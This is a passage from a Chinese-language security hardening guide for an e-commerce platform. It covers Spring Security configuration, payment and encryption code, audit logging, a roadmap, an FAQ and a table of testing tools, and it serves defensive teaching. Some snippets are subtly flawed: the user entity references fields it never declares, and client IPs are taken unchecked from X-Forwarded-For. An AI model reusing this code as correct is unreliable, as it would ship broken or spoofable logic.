  │• WAF规则 │   │• CORS    │   │• OAuth2  │   │• 输出编码│
  │• Bot防护 │   │• 路由    │   │• MFA     │   │• 权限检查│
  └──────────┘   └──────────┘   └──────────┘   └──────────┘
                                                     │
                   ┌──────────────────────────────────┘
                   │
  ┌──────────┐   ┌──────────┐   ┌──────────┐
  │  数据库   │   │  缓存     │   │  消息队列  │
  │          │   │          │   │          │
  │• 加密存储│   │• 会话管理│   │• 审计日志│
  │• 最小权限│   │• 限流计数│   │• 异步处理│
  │• 审计日志│   │• 验证码  │   │• 通知    │
  └──────────┘   └──────────┘   └──────────┘

═══════════════════════════════════════════════════════════════════
```

**1) 全局安全配置：**

```java
@Configuration
@EnableWebSecurity
@EnableMethodSecurity
public class EcommerceSecurityConfig {

    @Autowired
    private JwtAuthenticationFilter jwtAuthenticationFilter;

    @Autowired
    private RateLimitFilter rateLimitFilter;

    @Autowired
    private RequestLoggingFilter requestLoggingFilter;

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .securityMatcher("/api/**")
            .cors(cors -> cors.configurationSource(corsConfigurationSource()))
            .csrf(csrf -> csrf.disable())
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/v1/public/**").permitAll()
                .requestMatchers("/api/v1/auth/**").permitAll()
                .requestMatchers("/api/v1/admin/**").hasRole("ADMIN")
                .requestMatchers("/api/v1/seller/**").hasRole("SELLER")
                .requestMatchers("/api/v1/buyer/**").hasRole("BUYER")
                .requestMatchers("/api/v1/user/**").authenticated()
                .anyRequest().denyAll()
            )
            .exceptionHandling(exceptions -> exceptions
                .authenticationEntryPoint((request, response, authException) -> {
                    response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
                    response.setContentType("application/json;charset=UTF-8");
                    response.getWriter().write("{\"code\":401,\"message\":\"未认证\"}");
                })
                .accessDeniedHandler((request, response, accessDeniedException) -> {
                    response.setStatus(HttpServletResponse.SC_FORBIDDEN);
                    response.setContentType("application/json;charset=UTF-8");
                    response.getWriter().write("{\"code\":403,\"message\":\"无权限\"}");
                })
            )
            .addFilterBefore(requestLoggingFilter, UsernamePasswordAuthenticationFilter.class)
            .addFilterBefore(rateLimitFilter, UsernamePasswordAuthenticationFilter.class)
            .addFilterBefore(jwtAuthenticationFilter, UsernamePasswordAuthenticationFilter.class)
            .headers(headers -> headers
                .contentSecurityPolicy(csp -> csp.policyDirectives(
                    "default-src 'self'; " +
                    "script-src 'self'; " +
                    "style-src 'self' 'unsafe-inline'; " +
                    "img-src 'self' data: https:; " +
                    "connect-src 'self'; " +
                    "frame-ancestors 'none'; " +
                    "form-action 'self'; " +
                    "object-src 'none'"
                ))
                .frameOptions(HeadersConfigurer.FrameOptionsConfig::deny)
                .httpStrictTransportSecurity(hsts -> hsts
                    .includeSubDomains(true)
                    .maxAgeInSeconds(31536000)
                    .preload(true))
                .xssProtection(xss -> xss.headerValue(
                    XXssProtectionHeader.HeaderValue.ENABLED_MODE_BLOCK))
                .contentTypeOptions(Customizer.withDefaults())
            );
        return http.build();
    }

    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration config = new CorsConfiguration();
        config.setAllowedOrigins(List.of("https://shop.example.com"));
        config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE", "PATCH"));
        config.setAllowedHeaders(List.of("Authorization", "Content-Type", "X-Request-Id"));
        config.setAllowCredentials(true);
        config.setMaxAge(3600L);

        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/api/**", config);
        return source;
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        return new Argon2PasswordEncoder(16, 32, 1, 65536, 3);
    }
}
```

**2) 支付安全服务：**

```java
@Service
public class SecurePaymentService {

    private static final BigDecimal MAX_PAYMENT_AMOUNT = new BigDecimal("50000");
    private static final int MAX_DAILY_TRANSACTIONS = 20;

    @Autowired
    private PaymentRepository paymentRepository;
    @Autowired
    private AuditLogService auditLogService;
    @Autowired
    private RateLimitService rateLimitService;
    @Autowired
    private EncryptionService encryptionService;

    @Transactional
    public PaymentResult processPayment(PaymentRequest request, Long userId, String clientIp) {
        if (rateLimitService.isRateLimited("pay:" + userId,
                MAX_DAILY_TRANSACTIONS, Duration.ofDays(1))) {
            auditLogService.log("PAYMENT_RATE_LIMITED", userId, request.getAmount(), clientIp);
            throw new SecurityException("今日支付次数超过限制");
        }

        if (request.getAmount().compareTo(MAX_PAYMENT_AMOUNT) > 0) {
            auditLogService.log("PAYMENT_AMOUNT_EXCEEDED", userId, request.getAmount(), clientIp);
            throw new SecurityException("单笔支付金额超过限制");
        }

        if (request.getAmount().compareTo(BigDecimal.ZERO) <= 0) {
            throw new IllegalArgumentException("支付金额必须大于零");
        }

        String encryptedCardNo = encryptionService.encrypt(request.getCardNo());

        Payment payment = Payment.builder()
            .userId(userId)
            .orderId(request.getOrderId())
            .amount(request.getAmount())
            .currency(request.getCurrency())
            .cardNoMasked(maskCardNumber(request.getCardNo()))
            .cardNoEncrypted(encryptedCardNo)
            .status(PaymentStatus.PROCESSING)
            .clientIp(clientIp)
            .build();

        payment = paymentRepository.save(payment);

        auditLogService.log("PAYMENT_INITIATED", userId, payment.getId(),
            request.getAmount(), request.getOrderId());

        try {
            PaymentGatewayResponse gatewayResponse = callPaymentGateway(payment);
            payment.setStatus(gatewayResponse.isSuccess()
                ? PaymentStatus.COMPLETED : PaymentStatus.FAILED);
            payment.setTransactionId(gatewayResponse.getTransactionId());
        } catch (Exception e) {
            payment.setStatus(PaymentStatus.ERROR);
            auditLogService.log("PAYMENT_ERROR", userId, payment.getId(), e.getMessage());
        }

        payment = paymentRepository.save(payment);
        return PaymentResult.from(payment);
    }

    private String maskCardNumber(String cardNo) {
        if (cardNo == null || cardNo.length() < 4) return "****";
        return "****" + cardNo.substring(cardNo.length() - 4);
    }
}
```

**3) 数据加密存储：**

```java
@Entity
@Table(name = "users")
public class SecureUser {

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    @Column(nullable = false, unique = true, length = 50)
    private String username;

    @Column(nullable = false, columnDefinition = "TEXT")
    private String password;

    @Column(columnDefinition = "TEXT")
    private String encryptedIdCard;

    @Column(columnDefinition = "TEXT")
    private String encryptedPhone;

    @Column(length = 20)
    private String phoneMasked;

    @Column(columnDefinition = "TEXT")
    private String encryptedEmail;

    @Column(length = 20)
    private String emailMasked;

    @Enumerated(EnumType.STRING)
    @Column(nullable = false, length = 20)
    private UserRole role;

    @Enumerated(EnumType.STRING)
    @Column(nullable = false, length = 20)
    private AccountStatus status;

    @Column(nullable = false)
    private boolean mfaEnabled;

    @Column(length = 100)
    private String mfaSecret;

    @CreationTimestamp
    private LocalDateTime createdAt;

    @UpdateTimestamp
    private LocalDateTime updatedAt;

    @PrePersist
    @PreUpdate
    private void encryptSensitiveFields() {
        if (idCard != null && !idCard.isEmpty()) {
            this.encryptedIdCard = encryptionService.encrypt(idCard);
        }
        if (phone != null && !phone.isEmpty()) {
            this.encryptedPhone = encryptionService.encrypt(phone);
            this.phoneMasked = phone.substring(0, 3) + "****" + phone.substring(phone.length() - 4);
        }
        if (email != null && !email.isEmpty()) {
            this.encryptedEmail = encryptionService.encrypt(email);
            this.emailMasked = email.replaceAll("(?<=.).(?=.*@)", "*");
        }
    }
}
```

**4) 安全审计日志：**

```java
@Service
public class AuditLogService {

    private static final Logger log = LoggerFactory.getLogger("AUDIT");

    @Autowired
    private AuditLogRepository auditLogRepository;

    @Async
    public void log(String eventType, Object... details) {
        String detailStr = Arrays.stream(details)
            .map(Object::toString)
            .collect(Collectors.joining("|"));

        AuditLog auditLog = AuditLog.builder()
            .eventType(eventType)
            .details(detailStr)
            .timestamp(LocalDateTime.now())
            .requestId(MDC.get("requestId"))
            .build();

        auditLogRepository.save(auditLog);

        log.info("{}|{}", eventType, detailStr);
    }
}

@Configuration
public class AuditLogConfig {

    @Bean
    public SecurityFilterChain auditFilterChain(HttpSecurity http) throws Exception {
        http.addFilterBefore(new AuditLoggingFilter(), UsernamePasswordAuthenticationFilter.class);
        return http.build();
    }
}

public class AuditLoggingFilter extends OncePerRequestFilter {

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                    HttpServletResponse response,
                                    FilterChain filterChain) throws ServletException, IOException {
        String requestId = UUID.randomUUID().toString();
        MDC.put("requestId", requestId);
        MDC.put("clientIp", getClientIp(request));
        MDC.put("method", request.getMethod());
        MDC.put("uri", request.getRequestURI());

        response.setHeader("X-Request-Id", requestId);

        try {
            filterChain.doFilter(request, response);
        } finally {
            MDC.clear();
        }
    }

    private String getClientIp(HttpServletRequest request) {
        String ip = request.getHeader("X-Forwarded-For");
        return ip != null ? ip.split(",")[0].trim() : request.getRemoteAddr();
    }
}
```

**5) 安全配置文件：**

```yaml
server:
  port: 8443
  ssl:
    enabled: true
    key-store: classpath:keystore.p12
    key-store-password: ${SSL_KEYSTORE_PASSWORD}
    key-store-type: PKCS12
    protocol: TLSv1.3
    enabled-protocols: TLSv1.2,TLSv1.3
  servlet:
    session:
      timeout: 30m
      cookie:
        http-only: true
        secure: true
        same-site: strict

spring:
  datasource:
    url: jdbc:postgresql://db:5432/ecommerce?sslmode=require
    username: ${DB_USERNAME}
    password: ${DB_PASSWORD}
    hikari:
      maximum-pool-size: 20
      connection-timeout: 30000

  jpa:
    properties:
      hibernate:
        jdbc:
          time_zone: UTC
        connection:
          handling_mode: DELAYED_ACQUISITION_AND_RELEASE_AFTER_STATEMENT

  redis:
    host: redis
    port: 6379
    password: ${REDIS_PASSWORD}
    ssl: true

  security:
    oauth2:
      resourceserver:
        jwt:
          jwk-set-uri: https://auth.example.com/.well-known/jwks.json

jwt:
  private-key-path: ${JWT_PRIVATE_KEY_PATH}
  access-token-validity: 3600000
  refresh-token-validity: 604800000

encryption:
  aes:
    key-path: ${AES_KEY_PATH}
  rsa:
    key-store-path: ${RSA_KEYSTORE_PATH}
    key-store-password: ${RSA_KEYSTORE_PASSWORD}
    key-alias: signing

rate-limit:
  enabled: true
  default-limit: 100
  default-window: 60

logging:
  level:
    SECURITY: WARN
    AUDIT: INFO
  pattern:
    console: "%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] [%X{requestId}] %-5level %logger{36} - %msg%n"
```

### 17.2 从0到1构建安全体系

```
安全体系建设路线图
═══════════════════════════════════════════════════════════════════

  第一阶段 (1-3个月): 基础安全
  ──────────────────────────────
  □ HTTPS强制启用
  □ 认证与授权体系(JWT + RBAC)
  □ SQL注入防御(参数化查询)
  □ XSS防御(输出编码 + CSP)
  □ CSRF防御(Token机制)
  □ 安全响应头配置
  □ 密码安全存储(BCrypt/Argon2)
  □ 敏感数据加密

  第二阶段 (3-6个月): 深度防御
  ──────────────────────────────
  □ API限流防刷
  □ SSRF防御
  □ 文件上传安全
  □ 反序列化安全
  □ XXE防御
  □ 审计日志系统
  □ 依赖漏洞扫描
  □ 安全配置审计

  第三阶段 (6-12个月): 安全运营
  ──────────────────────────────
  □ SAST/DAST集成CI/CD
  □ WAF部署与规则优化
  □ SIEM日志分析
  □ 入侵检测系统
  □ 定期渗透测试
  □ 安全培训体系
  □ 应急响应流程
  □ Bug Bounty计划

  第四阶段 (12个月+): 持续安全
  ──────────────────────────────
  □ DevSecOps流水线
  □ 容器安全
  □ 零信任架构
  □ 安全度量体系
  □ 红蓝对抗演练
  □ 供应链安全
  □ 安全Champion计划
  □ 安全文化建设

═══════════════════════════════════════════════════════════════════
```

### 17.3 FAQ

**Q1: 安全加固应该从哪里开始？**

A: 从最高优先级的安全风险开始：1) 启用HTTPS；2) 修复认证和授权问题；3) 防止SQL注入和XSS；4) 加密敏感数据。这些是最常见也最容易被利用的漏洞。

**Q2: 安全和业务冲突时如何权衡？**

A: 安全是业务的保障而非对立面。关键原则：1) 严重漏洞必须修复（数据泄露风险远大于修复成本）；2) 中低风险可以记录并排期修复；3) 为业务提供安全的替代方案而非简单禁止。

**Q3: 如何衡量安全体系的有效性？**

A: 关键指标：1) 漏洞发现和修复时间（MTTD/MTTR）；2) 安全事件数量和影响；3) 渗透测试通过率；4) SAST/DAST扫描发现数趋势；5) 安全培训覆盖率；6) 安全事件响应时间。

---

## 附录

### A. 安全检查清单速查表

| 编号 | 检查项 | 类别 | 优先级 |
|------|--------|------|--------|
| 1 | 所有通信使用HTTPS | 传输安全 | P0 |
| 2 | 密码使用BCrypt/Argon2存储 | 数据安全 | P0 |
| 3 | 使用参数化查询 | SQL注入 | P0 |
| 4 | 所有输出进行编码 | XSS | P0 |
| 5 | 实施CSRF Token | CSRF | P0 |
| 6 | 实施认证和授权 | 访问控制 | P0 |
| 7 | 安全响应头配置 | 配置安全 | P1 |
| 8 | CORS白名单配置 | 配置安全 | P1 |
| 9 | 输入验证和长度限制 | 输入验证 | P1 |
| 10 | 文件上传安全检查 | 文件安全 | P1 |
| 11 | 敏感数据加密存储 | 数据安全 | P1 |
| 12 | SSRF防护 | 网络安全 | P1 |
| 13 | API限流 | 可用性 | P2 |
| 14 | 安全审计日志 | 监控 | P2 |
| 15 | 依赖漏洞扫描 | 依赖安全 | P2 |
| 16 | 反序列化安全 | 代码安全 | P2 |
| 17 | XXE防护 | 代码安全 | P2 |
| 18 | 容器安全配置 | 基础设施 | P3 |
| 19 | CI/CD安全集成 | DevSecOps | P3 |
| 20 | 定期渗透测试 | 安全测试 | P3 |

### B. 常用安全测试工具速查

| 工具 | 类别 | 用途 |
|------|------|------|
| sqlmap | SQL注入 | 自动化SQL注入检测与利用 |
| Burp Suite | Web测试 | 综合Web渗透测试平台 |
| Nmap | 网络扫描 | 端口扫描和服务识别 |
| Metasploit | 漏洞利用 | 渗透测试框架 |
| OWASP ZAP | DAST | Web应用动态安全扫描 |
| Nikto | Web扫描 | Web服务器漏洞扫描 |
| Nuclei | 漏洞扫描 | 基于模板的快速漏洞扫描 |
| Trivy | 容器扫描 | 容器镜像漏洞扫描 |
| SonarQube | SAST | 代码质量和安全分析 |
| Semgrep | SAST | 轻量级静态分析 |
| gitleaks | 密钥检测 | Git仓库密钥泄露检测 |
| Hashcat | 密码破解 | GPU加速密码哈希破解 |
| John the Ripper | 密码破解 | CPU密码哈希破解 |
| Hydra | 暴力破解 | 网络登录暴力破解 |
| Subfinder | 信息收集 | 子域名发现 |
| FFuF | 目录扫描 | Web目录模糊测试 |

### C. CVE与漏洞信息源

| 来源 | 网址 | 说明 |
|------|------|------|
| NVD | nvd.nist.gov | 美国国家漏洞数据库 |
| CVE | cve.org | 通用漏洞披露 |
| CNVD | cnvd.org.cn | 国家信息安全漏洞共享平台 |
| Exploit-DB | exploit-db.com | 漏洞利用数据库 |
| GitHub Advisory | github.com/advisories | GitHub安全公告 |
| OWASP | owasp.org | 开放Web应用安全项目 |
| Snyk Vulnerability DB | snyk.io/vuln | Snyk漏洞数据库 |

---

> 本文档版本: v2.0 | 最后更新: 2026年7月
>
> 声明: 本文档仅供安全研究和学习使用，不得用于非法用途。渗透测试必须在获得明确授权的情况下进行。
